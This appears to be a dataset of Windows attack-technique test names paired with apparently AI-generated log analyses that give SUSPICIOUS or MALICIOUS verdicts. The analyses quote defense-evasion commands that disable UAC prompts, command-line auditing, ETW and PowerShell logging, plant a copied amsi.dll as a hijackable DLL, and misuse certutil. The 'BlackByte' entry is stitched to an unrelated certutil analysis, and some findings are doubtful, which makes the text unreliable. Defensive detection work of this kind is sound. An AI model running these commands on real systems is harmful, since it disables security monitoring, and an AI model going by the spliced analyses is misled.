   - The System log outlines events consistent with routine system operations such as time adjustments and time source configuration, linked to the logged security events. Again, while these appear benign, checking for unusual frequencies or patterns over a broader timeframe is recommended.

### Assessment and Resolution:
- **Assessment**: The logs reveal the execution of a PowerShell script involving file operations that could indicate unauthorized data manipulation or movement. While the utilities used in the Sysmon logs are standard Windows components, the manner and sequence of their execution alongside these PowerShell commands are atypical and suspicious.
- **Resolution**: **SUSPICIOUS**. The PowerShell activities, system time changes (subject to the context), and their confluence signal potentially unauthorized activity that should be investigated further. A closer examination of:
  - The origin of the PowerShell script.
  - The user's intentions and access rights who executed these commands.
  - A thorough timeline of system operations and user activities around this timeframe.

### Guidance:
- Investigate the PowerShell script’s origin within the environment or network.
- Audit the access rights and login behaviors of `SERVER002\admin_test`.
- Review logs for any event patterns that align with common attack frameworks to determine if there is a larger attack or compromise context involving data exfiltration or modification activities.
- Engage with the user, if known, to ascertain whether these activities were sanctioned or part of a legitimate task."
Windows Add Registry Value to Load Service in Safe Mode without Network,"**Detailed Log Analysis:**

To evaluate the logs for signs of malicious activity, I'll analyze the different entries provided in each category.

**1. System Log:**
- Active entries mainly involve time synchronization actions by `svchost.exe` with `time.windows.com`. This is generally standard behavior essential for system time maintenance.
- No signs of suspicious activity from the time adjustment events noted.

**2. Application Log:**
- The logs primarily show the stopping of `edgeupdate` services, which typically indicates either standard updates management or service shutdown, nothing inherently suspicious or malicious noted here.
- The `Software Protection Platform Service` logged a simple time update behavior, which is typical as well.

**3. Sysmon Log:**
- Entries involve several process creation logs for legitimate Windows binaries and `Microsoft Edge Update` activities.
- `conhost.exe` and `wevtutil.exe` were executed multiple times by a user (`SERVER002\\admin_test`). However, the actions performed here (like executing `hostname.exe` and `whoami.exe`) generally represent typical administrative tasks, with no apparent malicious command lines or escalation behavior.
- One particular Sysmon event shows `cmd.exe` executing a registry modification command (`REG ADD\""HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Minimal\\fileSafeMode""`), which could potentially be troubling if not authorized, but its context is not provided to determine its intent. Needs deeper investigation.

**4. Security Log:**
- Focuses primarily on time change events triggered by `svchost.exe`, logged by the `Security-Auditing`. These entries usually align with the time synchronization found in the system logs. These actions are expected and benign.

**Analysis and Conclusion:**

The current logs do not undoubtedly signify malicious intent. Most processes and service actions appear regular. The presence of numerous `MicrosoftEdgeUpdate.exe` instances indicates routine software updates, which aligns with standard software management practices.

The only minor uncertainty is with registry modification (`cmd.exe /c REG ADD`) that could be part of legitimate diagnostics or adjustments, but could also be potentially unsafe if not expected in the environment. 

**Final Resolution: SUSPICIOUS**

The logs predominantly illustrate BENIGN activity. However, the registry adjustment at a high-integrity level necessitates verification for legitimacy. It is advisable to:
- Confirm if this registry modification was executed as part of a planned change.
- Check if similar activity has been performed on other hosts or during previous periods.
- Review policies around use of high-integrity scripts to prevent unauthorized change.


To proceed:
- Investigate and verify intent behind the registry entry modification.
- Consult with the responsible IT or administration personnel to confirm no authorized change aligns with the `cmd.exe` registry edits.
- If unauthorized, tighten controls and evaluate the host's security policies for irregular behavior mitigation. Consider a deeper forensic analysis if evidence suggests unapproved alterations."
Copy and Delete Mailbox Data on Windows,"Upon a detailed analysis of the provided Windows event logs, we can identify the following noteworthy points:

1. **Time Changes**:
   - Multiple events related to time changes are present in the system log, particularly involving the `svchost.exe` process. Event IDs `1` and `4616` indicate changes in system time which could be normal in some contexts but should be examined in production environments to ensure no unauthorized time adjustments.
   
2. **PowerShell Activity**:
   - PowerShell was executed with parameters that create, copy, and delete items in the user's directory. The command observed in the `Sysmon` and `Windows PowerShell` logs seems to perform a recursive copy of data from one directory to another and then deletes the destination. This behavior could be used as a means to read and exfiltrate data.
   
3. **Edge Update Service**:
   - Regular activities related to Microsoft Edge updates (e.g., `MicrosoftEdgeUpdate.exe` and `MicrosoftEdgeUpdateComRegisterShell64.exe`) are seen in logs. These seem to repeat regularly and appear to be part of standard update procedures.
   
4. **Execution of Management Utilities**:
   - Use of `whoami.exe`, `conhost.exe`, and `wevtutil.exe` processes by the user `SERVER002\\admin_test`. These may indicate reconnaissance actions, but they are not inherently malicious on their own.

5. **Execution Context**:
   - Logs indicate that processes are frequently running under `NT AUTHORITY\\SYSTEM`, which is expected for system updates but should be cautiously examined in cases like PowerShell, where unexpected scripts can run at high privilege levels.

**Assessment**:
- The behavior observed, especially concerning PowerShell activities, is potentially concerning due to the automated nature and command sequence. PowerShell scripts often automate administrative tasks, but the specific use observed here can imply potential data manipulation or exfiltration, aligning with techniques seen in malicious activities.
- The execution of system management utilities is worth further inquiry to ensure they align with expected tasks by the responsible administrative accounts.

**Resolution**: **SUSPICIOUS** - These logs highlight activities that, while not conclusively malicious, display elements often associated with suspicious behavior. This includes automated PowerShell commands potentially indicating data manipulation. Further investigation is recommended to confirm if these activities align with a legitimate administrator's operational usage or indicate a more sinister motive such as unauthorized access or data exfiltration.

**Guidance**:
- Verify recent administrator activities to validate these actions.
- Investigate if there were any network connections or transfers associated with the execution of the suspicious PowerShell commands.
- Implement monitoring for any further unexpected administrative actions or scripts running on the system."
Rundll32 execute command via FileProtocolHandler,"Based on the analysis of the provided Windows event logs, the following observations are made:

### System and Security Logs
- Several entries indicate time adjustments by the Windows Time Service (`EventID=35`) and kernel events related to time changes (`EventID=1`, `EventID=24`). These logs show time synchronization actions and do not indicate any malicious intent as time adjustments are common in server operation for maintaining accurate time.

### Sysmon Log
- The Sysmon logs do present some interesting events, notably:
  - The execution of processes like `wevtutil.exe`, `conhost.exe`, and others from the `SERVER002\admin_test` user. The use of `wevtutil` could be legitimate for querying or clearing event logs, but frequent use by a non-administrative script or program can potentially indicate attempts to obfuscate actions by a sophisticated user.
  - The execution of `cmd.exe` with a command line that includes `rundll32.exe url.dll,FileProtocolHandler calc.exe`. This pattern is unusual because it appears to be attempting to open the Windows Calculator (`calc.exe`) via a URL handler, which is non-standard behavior and often associated with misuse of `rundll32` to execute code indirectly.

### Application Log
- The application log indicates a normal service stop for `edgeupdate`, which is associated with Microsoft Edge updates. This by itself does not indicate any malicious activity but should be noted as part of routine application operations.

### Malicious Indicators
- The most concerning sequence is the execution of `cmd.exe` with a command line involving `rundll32.exe`. Using `rundll32.exe` for non-standard operations such as opening `calc.exe` might appear benign at a surface level due to involving a harmless application like Calculator. However, this execution method is frequently used in real-world attacks to obfuscate malicious actions.

### Summary
Combining these findings, the activity related to the usage of `rundll32.exe` suggests a possible test or proof-of-concept invocation, which aligns with tactics often seen in malicious activities seeking to leverage system binaries for non-explicitly authorized command execution.

### Risk Assessment and Resolution
- **Resolution**: SUSPICIOUS
- **Guidance**: Although no direct malicious action altering or compromising the system has been identified, the method of executing potential commands using `rundll32.exe` is suspicious and indicative of tactics possibly used for exploration of system vulnerabilities or privilege escalation. It would be prudent to investigate this behavior further, including reviewing user activity, verifying the legitimacy of the invocations, and ensuring no unauthorized scripts or binaries are executing similar patterns on the system.

Recommend additional monitoring of the user's sessions, potential restrictions on `rundll32` usage, and a more comprehensive review of system integrity and log files are advisable."
Msiexec.exe - Execute Local MSI file with embedded VBScript,"Analyzing the provided Windows event logs reveals several activities that raise concerns about potential malicious behavior, warranting further investigation.

### Suspicious or Anomalous Behavior:

1. **Unusual PowerShell Execution:**
   - In the PowerShell logs, instances of PowerShell execution are seen with the `-nop` (No Profile) flag. This is often used to avoid loading a user's PowerShell profile and may indicate an attempt to execute PowerShell stealthily (`powershell.exe -nop -Command Write-Host VBScript executed me; exit`).
   - The command-line also includes statements like ""Write-Host VBScript executed me"" which seems suspicious, indicating potentially unwanted script execution triggered by a VBScript.

2. **MSI Installer Execution from Temp Directory:**
   - Multiple logs reference an `.msi` file being executed from a temporary directory: `C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.007\bin\data.007_VBScript.msi` using `msiexec.exe`. Executing installers from temporary directories is atypical and often seen in malicious activities.

3. **Time Manipulation:**
   - Security and System logs show events (`EventID 4616: System time was changed`) indicating time modifications, which can be a red flag as malicious actors sometimes manipulate system time to circumvent time-based security controls or to evade detection.

4. **Multiple `wevtutil.exe` and `cmd.exe` Executions:**
   - The Sysmon logs reflect multiple executions of `wevtutil.exe` (Event Log Utility) and `cmd.exe` (Command Prompt), suggesting attempts to query, clear, or manipulate Windows event logs – a technique used by attackers to cover their tracks.

### Assessment of Malicious Activity:

Given the occurrence of the unusual PowerShell execution, the execution of an MSI from a temp directory with potential ties to VBScript, changes to the system time, and potential indications of log tampering activities, these logs strongly suggest suspicious, possibly malicious activity. These indicators align with several known tactics and techniques used in cyber incidents to initiate and maintain unauthorized access or perform malicious activities stealthily.

### Detailed Analysis:

1. **Frequent Execution of `wevtutil.exe` and `conhost.exe`:**
   - The logs show repeated executions of `C:\Windows\System32\wevtutil.exe` and `C:\Windows\System32\conhost.exe` by the user `SERVER002\admin_test`.
   - `wevtutil.exe` is a legitimate tool for event log management on Windows systems. However, its frequent execution, especially in such close succession, could indicate script-based automation, possibly for log interrogation or clearing.
   - `conhost.exe` is the Console Window Host, traditionally used to manage command-line interfaces. Its frequent invocation implies automated or mass command execution.
   
2. **Presence of `cmd.exe` with Registry Modification:**
   - There is a command-line entry: `cmd.exe /c reg add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f`.
   - This particular command modifies the User Account Control (UAC) behavior to disable admin consent prompts, which is a common tactic used by malware or attackers to escalate privileges unnoticed.

3. **Utilization of `whoami.exe` and `hostname.exe`:**
   - `whoami.exe` is executed to determine the user's logged-on details, potentially as part of reconnaissance.
   - `hostname.exe` is typically benign but can be part of scripts aiming to gather environment information.

4. **Suspicious Time Change:**
   - The logs indicate a rollback of the system time (`EventID: 4616`), which can be concerning as attackers might manipulate time settings to interfere with forensic investigations or logging.

5. **Usage of High Privileges:**
   - Multiple privilege assignments are noted (`EventID: 4672`) for the user `admin_test`, which includes powerful rights like `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and others typically abused for unauthorized activities.

6. **Network Logon from Various IP Addresses:**
   - Security log entries (`EventID: 4624`) illustrate NTLM network logons from IP addresses, indicating possible remote access, either legitimate or otherwise.
   
### Assessment:

- **SUSPICIOUS:** The analysis points to activities that are unusual and potentially indicative of malicious intentions, but not definitively so with the provided logs. Further investigation is necessary to ascertain the intent and exact nature of these activities, emphasizing verification of legitimate tasks versus malicious conduct."
Disable Windows Command Line Auditing using reg.exe,"After carefully analyzing the provided logs, here is a detailed breakdown of some potential indicators of interest and the corresponding findings:

### Security Log
- The security log events primarily show time adjustments by the system process `C:\Windows\System32\svchost.exe`. These time change events are conducted by a system process and do not inherently indicate malicious activity.

### Sysmon Log
1. **Wevtutil and Conhost Executions:**
   - Multiple instances of `wevtutil.exe` and `conhost.exe` are being executed by the user `SERVER002\admin_test`. `Wevtutil.exe` is typically used for event log management, which in some contexts could be benign (e.g., clearing event logs, querying). However, repetitive executions in a short span can be suspicious if not expected in normal operations.
  
2. **Unusual Activity with Hostname and Whoami:**
   - Commands executed like `hostname.exe` and `whoami.exe` are often benign queries for system information. They are executed by `SERVER002\admin_test`, which implies a user-level process and not system-level. While they are scripts frequently used for diagnostics, repeated execution suggests possible reconnaissance activity by a user or script.

3. **Registry Modification:**
   - There are several command executions related to registry changes through `cmd.exe`:
     - `cmd.exe /c reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 0 /f`
   - This registry alteration is of particular concern because it suggests an attempt to modify auditing settings, potentially to obscure detecting malicious activities. 

4. **Edge Update Activity:**
   - The log shows several processes related to Microsoft Edge updating. These entries could be routine updates if Microsoft Edge is scheduled for updates. Multiple appearances of `MicrosoftEdgeUpdate.exe` executed by `NT AUTHORITY\SYSTEM` suggest system-level operations, typically benign unless it's outside usual update windows or contexts.

### Application Log
- Logs simply show ""Service stopped"" events related to `edgeupdate` without additional context, which aligns with the Edge update activities noted above.

### System Log
- Logs primarily indicate standard system operations like time synchronization, which are generally benign.

### Assessment

The logs reveal an important registry alteration, which combined with the pattern of execution and the nature of tools used, suggests that it is potentially suspicious:

- **Registry modification** to potentially disable logging or detection (especially when performed through `cmd.exe` as shown in the Sysmon logs).
- **Frequent use of system utilities (`wevtutil.exe`, `hostname.exe`, `whoami.exe`)** that could be normal but are often used in post-exploitation or reconnaissance scripts.
- **Log manipulation suspicion**, considering the `wevtutil.exe` utilizations, implies potential hiding of further activities.

### Conclusion

Based on the above analysis, there is no definitive proof of malware, but there are indicators strongly suggesting behavior that warrants further investigation, especially concerning the registry changes and the pattern of command executions. The resolution for the current state of logs is:

- **SUSPICIOUS** - There are signs that need further analysis. Investigate for additional indicators beyond logs (like changes to security policies, system integrity, unauthorized accounts, etc.), verify the context of registry changes, and assess if `SERVER002\admin_test`’s activities fit regular behavioral patterns."
Msiexec.exe - Execute Local MSI file with embedded JScript,"### Analysis of Windows Event Logs

After analyzing the provided logs from the Sysmon and Application logs, I have identified a series of activities that may warrant further investigation.

#### **Suspicious Behaviors Noticed:**

1. **Frequent Execution of System Utilities:**
   - There are frequent executions of common system utilities like `whoami.exe`, `hostname.exe`, and `wevtutil.exe` initiated by an administrative user `SERVER002\\admin_test`. While these executables are legitimate Windows utilities, their frequent and close-timed execution may indicate scripting or automation, which in itself is not inherently malicious but should be examined for intent.

2. **PowerShell Execution:**
   - The presence of logged PowerShell executions without context from the PowerShell log can indicate script execution, which can also be legitimate or part of a post-exploitation activity. A more detailed check on any command-lines provided by PowerShell execution would be useful.

3. **Installation of an MSI package:**
   - The logs indicate an installation process initiated via `msiexec.exe` with the command `c:\\windows\\system32\\msiexec.exe /q /i ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.007\\bin\\data.007_JScript.msi""`. This is installed from a temporary location, which is a common technique used to deploy malware or Persistence payloads. The silent installation (`/q`) raises concerns about potential unauthorized installations.

4. **`wsmprovhost.exe` as Parent Process:**
   - The frequent appearance of `wsmprovhost.exe` as a parent process may suggest PowerShell remoting or Windows Remote Management (WinRM) sessions being established, which aligns with the administrative actions observed. This could be legitimate; however, it merits checking if such remote management was sanctioned.

#### **Events that Stand Out:**

- **Sysmon Event ID 1 and 5:**
  - These events indicate process creation (`EventID 1`) and process termination (`EventID 5`). Special attention is needed where `cmd.exe` and `msiexec.exe` are invoked, especially related to potential installation actions traced back to command arguments which could deploy unwanted applications.

- **Application Log Event ID 1040 and 1042 (MsiInstaller):**
  - Highlighting the activities pertaining to the installation of `data.007_JScript.msi`. This event confirms the MSI package installation process, complementing the Sysmon logs.

### Assessment and Recommendations:

**Resolution: SUSPICIOUS**

Given the above points of examination, the activity observed requires additional investigation to confirm the legitimacy or identify any compromise. Here are the suggested steps moving forward:

1. **Investigate Installed Package:** Confirm the origin and verify the integrity of the `data.007_JScript.msi` to ensure it is not a malicious payload.
   
2. **Verify User Actions:** Determine if the administrative user `SERVER002\\admin_test` performed these actions knowingly or if their account may have been compromised.

3. **Analyze PowerShell Logs:** Obtain detailed PowerShell logs to understand any commands executed, providing more context to the actions initiated.

4. **Review Security Policies:** Ensure that the use of WinRM and execution of critical system utilities are in line with the organization's security policies.

These steps will help determine if the observed activities are part of normal administrative tasks or if they point towards a potential security incident."
Phantom Dll Hijacking - WinAppXRT.dll,"### Analysis of the Logs

Upon analyzing the provided logs, the following observations and findings can be noted:

1. **Microsoft Edge Update Activity**:
   - Events indicate several executions of `MicrosoftEdgeUpdate.exe`. This executable is a legitimate component used by the Microsoft Edge browser for updates. The Sysmon logs show the command line arguments passed include `/ua /installsource core`. These parameters are typical for update processes and do not inherently indicate malicious activity.

2. **Executing Command-line Tools**:
   - `whoami.exe` and `hostname.exe` are executed, displaying information about the current logged-on user and hostname, respectively. These tools are commonly used in script execution or troubleshooting activities. However, by themselves, they do not indicate malicious intent unless accompanied by other suspicious activities.
   - The execution of these tools happens under the user `SERVER002\\admin_test`, which is consistent throughout various processes, suggesting that activities are likely occurring under a legitimate user session.

3. **Anomalous CMD Activity**:
   - A specific `cmd.exe` execution appears designed to copy and rename the `amsi.dll` (Antimalware Scan Interface) and make registry changes:
     ```shell
     copy %%windir%%\\System32\\amsi.dll %%APPDATA%%\\amsi.dll & ren %%APPDATA%%\\amsi.dll WinAppXRT.dll & copy %%APPDATA%%\\WinAppXRT.dll %%windir%%\\System32\\WinAppXRT.dll & reg add ""HKEY_CURRENT_USER\\Environment"" /v APPX_PROCESS /t REG_EXPAND_SZ /d ""1"" /f
     ```
   - This behavior, aimed at tampering with `amsi.dll`, is suspicious. Tampering with `amsi.dll` is a known tactic used by malware to bypass antivirus checks, as the file is crucial for attack detection by security solutions.
   - The command modifies the registry key under `HKEY_CURRENT_USER`, which could potentially set up a backdoor or persistence mechanism.

4. **Registry Modifications**:
   - The `reg.exe` tool is used to add entries into the registry, specifically:
     ```shell
     reg add ""HKEY_CURRENT_USER\\Environment"" /v APPX_PROCESS /t REG_EXPAND_SZ /d ""1"" /f
     ```
   - This operation follows the abovementioned tampering activity, further indicating suspicious behavior.

### Assessment

Based on the logs, there are clear signs of potentially malicious activity:

- The command aiming to tamper with `amsi.dll` alongside registry manipulation is a red flag.
- This activity pattern closely aligns with known malware tactics trying to disable security measures for persistence and execution of further malicious activities.

### Conclusion

- **Resolution**: **MALICIOUS**
- **Threats/Risks Identified**: The malicious activity primarily includes disabling security measures by tampering with legitimate files and making unauthorized registry changes. This strongly indicates an attempt to bypass security defenses, which aligns with compromise techniques.

Disable .NET Event Tracing for Windows Via Registry (cmd),"Based on the provided logs from Microsoft-Windows-Sysmon:

### Analysis Summary:

1. **Frequent Execution of Windows Utilities**: 
   - **wevtutil.exe** and **conhost.exe** were executed multiple times in quick succession by the user `SERVER002\admin_test`. While `wevtutil.exe` is a legitimate Windows utility for managing event logs, its repeated execution with `conhost.exe` can be indicative of event log tampering or reconnaissance activity, especially without accompanying details like specific command-line arguments that can clarify benign use.
   
2. **Execution of Common Reconnaissance Commands**:
   - Execution of `whoami.exe` and `cmd.exe` with registry modification command: `REG ADD HKLM\Software\Microsoft\.NETFramework /v ETWEnabled /t REG_DWORD /d 0`. The execution of `whoami.exe` can be standard for checking current user context, but becomes suspicious if combined with other activities like registry modification. The alteration of the `.NETFramework` ETWEnabled setting to 0 is a technique that can be used to disable Event Tracing for Windows (ETW), which could be part of anti-forensic activities.

3. **Browser Update Activities**:
   - Repeated executions of **Microsoft Edge Update** processes are observed. These are typically benign as they align with system or scheduled tasks to update the browser. However, they should be cross-verified for legitimacy if they match expected schedules and versions.

4. **System-level Executions**:
   - Various processes are being run with `NT AUTHORITY\SYSTEM` privileges, which is standard for system updates and management processes like `TiWorker.exe` and `TrustedInstaller.exe`.

### Assessment:

- **Potential Reconnaissance or Evasion**: The repeated use of `wevtutil.exe` and the registry modification via `cmd.exe` indicate this might not be routine system maintenance, especially given the absence of other specific benign indicators within the log.

### Conclusion:

**Resolution**: SUSPICIOUS

### Recommendations:

- **Further Investigation Needed**: 
  - Examine the specific usage and context around the `wevtutil.exe` commands.
  - Validate the user account `SERVER002\admin_test` for any privileges that may seem excessive for its role, and investigate its recent access logs.
  - Cross-reference the registry modification action for signs of unauthorized script execution or policy deviation.

- **Monitoring & Alerts**: 
  - Establish monitoring and alerts for repeated executions of utilities like `wevtutil.exe` if not already in place.
  - Review any other devices or logs within your environment for similar patterns that might indicate a larger issue.

Windows HideSCAHealth Group Policy Feature,"Let's conduct a detailed analysis of the provided Windows event logs to identify indicators of potential malicious activity:

1. **Application Log:**
   - The logs show events from the ""Software Protection Platform Service"" and ""edgeupdate"" services. The existence of stopped services, especially update services, often appear suspicious. However, in this context, stopped edgeupdate services likely coincide with update-related activities.

2. **Sysmon Logs:**
   - **Process Activity (Event ID 1):**
     - Processes like `whoami.exe`, `conhost.exe`, `cmd.exe`, `reg.exe`, and multiple instances of Microsoft Edge Update executables are being executed. 
     - The execution of `whoami.exe`, `cmd.exe`, and `reg.exe` commands can indicate an attacker trying to gather information or modify system settings. Specifically, the command to add a registry key under `HKEY_CURRENT_USER` to hide system components is typical of certain forms of malware.
     
   - **File Hashes and Paths:**
     - Executables like `cmd.exe` and `reg.exe` show execution from `C:\Users\ADMIN_~1\AppData\Local\Temp\`, a path typically used for temporary files. This could indicate an interim phase in malicious activity.
  
   - **Integrity Levels:**
     - Process integrity levels are high, indicating elevated privileges which may be necessary for an attacker to make system changes or to carry out certain types of malicious activities.

3. **EdgeUpdate Activities:**
   - A considerable number of logs are related to Microsoft Edge updates. These entries typically involve updating software, which can often run processes in a sequence. However, their timing relative to the suspicious registry changes could indicate either a legitimate update process or an exploited service.

4. **Registry Modification:**
   - An especially concerning entry involves the execution of the following command via `cmd.exe` to modify the registry:
     ```
     reg add ""HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer"" /v HideSCAHealth /t REG_DWORD /d 1 /f
     ```
     Direct registry manipulation, particularly to adjust policies and explorer settings, could be indicative of malware attempting to hide its activity from the user or administrator.
     
**Assessment and Resolution:**

Based on the analysis, there are indicators of suspicious activities, such as the registry modification through the command line, which should be further investigated. This type of activity is commonly associated with malware attempting to hide its presence or actions. However, without corroborating evidence from other log sources or more context about the system's normal operations at that time, it cannot be conclusively determined as malicious.

**Resolution: SUSPICIOUS**

**Guidance on How to Proceed:**
- Review system audits and integrity checks to look for more context around these activities.
- Investigate further into the user account `admin_test` for unusual activity around the same timestamp.
- Conduct a malware scan to detect possible infections.

InstallHelper method call,"Upon reviewing the event logs provided, the following observations were made:

1. **PowerShell Activity**: There is a significant amount of PowerShell activity captured in the logs, specifically the execution of a script named `InstallUtilTestHarness.ps1` located in a temporary directory. The PowerShell command appears to involve building and invoking assembly files, which is associated with testing or possibly exploiting a .NET feature.

2. **Suspicious PowerShell Usage**: The `Invoke-BuildAndInvokeInstallUtilAssembly` function is being used, which is not a standard PowerShell cmdlet and indicates a custom script that likely builds and executes a .NET assembly. This could potentially be used for malicious purposes, such as loading malicious code into memory.

3. **Temporary Directory Usage**: The execution and file activity related to the PowerShell script are taking place within temporary directories. The script involves filenames like `data.004.dll` and paths in the temp directory, which is a common practice for malware execution to avoid persistent storage and detection.

4. **Commands and Compilers**: Usage of commands like `csc.exe` (C# Compiler) and operations such as adding types within PowerShell suggest there is code compilation happening on the host. This is indicative of possibly compiling and running code dynamically, which can be used to evade static detection.

5. **Network Service and SYSTEM User Contexts**: The Sysmon logs indicate that various system processes are being executed under the `NT AUTHORITY\SYSTEM` and `NT AUTHORITY\NETWORK SERVICE` security contexts. This might not be suspicious by itself but coupled with the PowerShell activity might indicate privilege misuse.

6. **Edge Update Activity**: There is a lot of activity related to `MicrosoftEdgeUpdate.exe`. While typically not suspicious because it is used for Microsoft Edge updates, persistent and numerous updates or unrelated context usage might be concerning.

7. **Presence of `wevtutil.exe` executions**: The usage of `wevtutil.exe` which is a legitimate Windows command allowing command line access to event logs commands is seen. If this is executed in a suspicious sequence or frequency, it often points towards event log cleanups which are a common adversary tactic after malicious activities.

Based on these observations, the logs suggest potentially suspicious behavior:

- The involvement of custom PowerShell scripts executing from temporary directories and compiling code could suggest a test or malicious setup, especially if user activity doesn't expect such automation or development.
- The consistent usage of temporary directories and the network/system context for service executions and updates should be scrutinized for atypical behavior.

Given these findings, the resolution of this situation should be classified as:

**SUSPICIOUS** - While there isn't definitive malicious activity confirmed from these logs alone, the combination of behaviors is enough to warrant a more in-depth investigation. Further steps should include confirming user intent and authorizations and monitoring for any persistence mechanisms or outbound connections from this host which might indicate compromise."
BlackByte Ransomware Registry Changes - Powershell,"**Analysis of Logs:**

The provided logs span across various types including Sysmon, PowerShell, Security, System, and Application logs. Let's analyze these logs sequentially:

### Sysmon Logs:
The Sysmon logs reveal multiple instances of processes being created predominantly by `SERVER002\admin_test`. Here are the key observations:

1. **Process Creation**:
   - Multiple instances of `wevtutil.exe` and `conhost.exe` running consecutively within the same second. The primary process creating these is listed under the admin user account (`SERVER002\admin_test`).
   - The use of `wevtutil.exe` could simply be related to an administrative task, but repeated execution in rapid succession can indicate potential misuse.
   
2. **Hostname and Whoami Executions**:
   - The logs also indicate `HOSTNAME.EXE` and `whoami.exe` executions. The use of `whoami.exe` could imply privilege enumeration.

3. **PowerShell Execution**:
   - A critical Log entry shows the execution of `powershell.exe` with actions that modify the registry. Specifically, the PowerShell command modifies `LocalAccountTokenFilterPolicy`, `EnableLinkedConnections`, and `LongPathsEnabled` settings under HKLM. Such changes, especially in rapid succession, can be indicative of an attempt to alter system configurations/security settings potentially for lateral movement or persistence.

### Windows PowerShell Logs:
The PowerShell logs reiterate the same registry modification activities. No additional commands or functions of concern are immediately evident in these logs, supporting the Sysmon findings regarding PowerShell activity.

### Security Logs:
The Security logs reflect minor time changes. These could be legitimate time synchronization activities. However, frequent time changes can be abnormal especially if associated with privilege escalation attempts or evasion techniques.

### System Logs:
System logs primarily show the activity related to time adjustment, supporting the presence of time-related services executed possibly for synchronization (e.g., connection to `time.windows.com`).

### Application Logs:
No significant anomalous behavior is observable in the application logs. They reflect routine activities related to Software Protection.

### Assessment:
The series of activities captured in the logs involves high levels of process creation, including specialized tool usage like `wevtutil.exe`, alongside power shell scripts altering security-related registry keys. These adjustments raise concerns about potential malicious configuration changes.

### Application Log:
- **Windows Defender State On (EventID 15):** Indicates that Windows Defender is currently enabled and running, which is typically a sign of a healthy system.

### Security Log:
- **Logon Success (EventID 4624):** A successful logon was recorded for the SYSTEM user, which is standard behavior for system processes.
- **Special Privileges Assigned (EventID 4672):** SYSTEM user was granted multiple privileges, including `SeDebugPrivilege` and `SeBackupPrivilege`. While this can be typical for SYSTEM processes, it warrants attention if combined with other suspicious activity.
- **Time Change (EventID 4616):** Indicates a change in system time by the LOCAL SERVICE, but without additional context or frequent changes, this remains non-suspicious.

### Sysmon Log:
- **Use of `CertUtil.exe`:** There are indications of `cmd.exe` being used to copy `certutil.exe` to a temporary location and then using it to encode/decode a file (`calc.exe`). `Certutil.exe` is a known tool often abused by attackers for data encoding and encryption.
  
### Detailed Analysis:
1. **Encoded/Decoded Operations with CertUtil:**
   - The use of `certutil.exe` to encode and decode a file (`calc.exe`) as shown by multiple command-line invocations is highly suspicious. Certutil is commonly used by attackers to bypass security mechanisms and perform malicious actions, such as encoding payloads to avoid detection.
   - The process flow (`certutil.exe`, encoding of `calc.exe`, and resulting `.tmp` and decoded `.exe` files in a temporary directory) adheres to known tactics for file manipulation and payload preparation by attackers.

2. **Multiple System Processes Invocations (`wevtutil` and `conhost`):**
   - Multiple instances of `wevtutil.exe` and `conhost.exe` under the `admin_test` user may indicate log clearing or other administrative tasks. While `wevtutil` is a legitimate administrative tool, its overuse or misuse could also signify attempts to manipulate event logs, common in adversarial activities.

3. **CommandLine Execution of Cmd.exe:**
   - The command executed (`cmd.exe /c copy %windir%\\system32\\certutil.exe %temp%\\tcm.tmp & ...`) suggests a scripted operation, potentially by an unauthorized user to misuse `certutil.exe` capabilities.

### Conclusion:
The key suspicious activity lies in the abusive use of `certutil.exe` for encoding/decoding operations involving a system executable, `calc.exe`, and the pervasive use of `wevtutil.exe` and `conhost.exe`. These are indicative of potentially unauthorized administrative or malicious activities. The combination of these factors strongly suggests an effort to exploit system tools for potentially malicious purposes.

**Final Assessment: MALICIOUS**

### Guidance:
- **Immediate Actions:**
  - Investigate the `admin_test` account for any unauthorized access or credentials compromise.
  - Examine file artifacts (especially those manipulated using `certutil.exe`) to determine any malicious payloads.
  - Conduct a full security audit of the system, focusing on privilege abuse and lateral movement.
  
- **Preventive Measures:**
  - Enhance monitoring of command-line activities and usage of dual-use tools like `certutil.exe`.
  - Implement anomaly detection to spot unusual patterns in administrative tool usage.
  
- **Remediation:**
  - If any threats are confirmed, isolate the machine from the network and proceed with incident response protocols."
Windows Powershell Logging Disabled,"Based on the analysis of the provided Windows event logs:

1. **Sysmon Logs**: 
   - The logs primarily show processes being executed such as `wevtutil.exe`, `conhost.exe`, `whoami.exe`, and several Microsoft Edge update executables. The commands executed in these logs seem standard and reflect routine administrative tasks and legitimate software updates.
   - The execution of `cmd.exe` with commands to modify the registry settings related to PowerShell logging is suspicious. It appears that the logging features for PowerShell are being disabled, which can be indicative of attempts to avoid detection by an unauthorized user or malware.
  
2. **Application Logs**:
   - Logs indicate the `Microsoft Edge Update` service stopping and restarting, which aligns with software update processes. This behavior is routine during updates and not inherently suspicious.

3. **Security Logs**:
   - The logs show standard time change entries, which are often benign, attributed to system adjustments or synchronization with time servers.

4. **System Logs**:
   - These contain time correction entries, which correspond to time adjustment changes, indicating that the system synchronizes time via `time.windows.com`. This is standard behavior for Windows systems.

**Assessment**:
- **Suspicious Behavior**: The command line executed via `cmd.exe` to alter PowerShell logging settings raises a red flag. This kind of operation is often used to cover tracks by preventing security logging and monitoring. It necessitates further investigation to determine if an internal policy or an automated script triggered these modifications or if they are indicative of malicious intent.

**Resolution**: 
- **SUSPICIOUS**: The activity altering PowerShell logging settings is out of place and requires additional investigation to confirm the nature and intent of these changes. The remaining entries are routine or associated with legitimate processes like system and software updates.
  
**Guidance**:
- Investigate the source and intent behind the registry changes disabling PowerShell logging. This includes verifying if these changes were made by an authorized script or user.
- Review the system for any unauthorized remote access or administrative actions, especially in relation to the `admin_test` account.
- Validate the integrity of the system to ensure that no unauthorized modifications were made outside of the logs presented.
- Once the investigation is complete, consider re-enabling PowerShell logging (if deemed unnecessary to be disabled by policy) to monitor potential further malicious activity."
Tamper with Windows Defender Registry,"Upon reviewing the provided Windows event logs, here are the key observations and findings regarding potential malicious activity:

### Suspicious Activity:
1. **PowerShell Command Execution:**
   - A PowerShell command was executed with the intent of modifying the registry to disable Windows Defender's AntiSpyware component:
     ```
